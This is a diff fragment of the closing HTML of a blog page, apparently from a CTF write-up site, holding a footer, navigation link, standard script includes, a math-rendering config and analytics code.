+            <a href="/posts/defcamp-ctf-2022/" class="next" rel="next" title="DefCamp CTF 2022">DefCamp CTF 2022<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/Chovid99" target="_blank">Chovid99</a></span></div>
+        </div>
+    </footer></div>
 
-
-  </body>
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
+            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+            gtag('config', 'G-19HP521HQ9', { 'anonymize_ip': true });
+        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9" async></script></body>
 </html>
